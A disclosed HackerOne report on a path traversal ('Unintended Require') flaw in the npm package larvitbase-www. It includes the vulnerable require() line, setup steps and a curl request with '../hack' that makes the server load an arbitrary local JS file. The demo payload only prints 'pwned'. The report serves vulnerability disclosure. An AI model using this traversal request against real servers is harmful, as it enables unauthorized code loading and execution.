# [larvitbase-www] Unintended Require

## Report Details
- **Report ID**: 579560
- **URL**: https://hackerone.com/reports/579560
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2019-05-14T00:11:14.279Z
- **Disclosed**: 2019-09-03T11:18:13.527Z

## Reporter
- **Username**: ermilov
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report Unintended Require vulnerability in `larvitbase-www`
It is similar to bug found here #566056 because the module is maintained by the same developer, but it is a different module and the code behind the vulnerability is different.
It allows loading arbitary non-production code (js files).

# Module

**module name:** larvitbase-www
**version:** 0.7.5
**npm page:** `https://www.npmjs.com/package/larvitbase-www`

## Module Description

Website base framework based on larvitbase (https://github.com/larvit/larvitbase)

## Module Stats

20 downloads in the last day
72 downloads in the last week
651 downloads in the last month

# Vulnerability

## Vulnerability Description

`larvitbase-www` is an HTTP server which dynamically loads (with help of `require()`) some parts of the code. As long as the path to required module is partially depend on the url (req.urlBase), anybody can cause code to load that was not intended to run on the server.

source code example:

https://github.com/larvit/larvitbase-www/blob/master/index.js#L336
```
require(req.routed.controllerFullPath)(req, res, cb);
```

Detailed description of this bug can be found here: https://nodesecroadmap.fyi/chapter-1/threat-UIR.html

## Steps To Reproduce:

* create directory for testing
```
mkdir poc
cd poc/
```

* install package
```
npm i larvitbase-www
```

* create index.js file with default usage of larvitbase-www

index.js (example code form https://www.npmjs.com/package/larvitbase-www)
```
const	App	= require('larvitbase-www');
 
let	app;
 
app = new App({
    'baseOptions':	{'httpOptions': 8001},
    'routerOptions':	{},
    'reqParserOptions':	{},
});
 
app.start(function (err) {
    if (err) throw err;
});
```

* create hack.js file with some arbitary code for testing

hack.js
```
console.log('pwned');
```

* start index.js
```
node index.js
```

* send crafted request to web app (localhost:8001 by deafult) in order to force using of hack.js script
```
curl --path-as-is 'http://localhost:8001/../hack'
```

* index.js should log something like this to terminal:
```
pwned
                        require(req.routed.controllerFullPath)(req, res, cb);
TypeError: require(...) is not a function
```

## Patch

## Supporting Material/References:

- OS: Linux Mint current
- Node.js: 8.11.1
- NPM: 6.4.0

# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

An attacker is able to control the x in require(x) and cause code to load that was not intended to run on the server.

## Attachments
No attachments
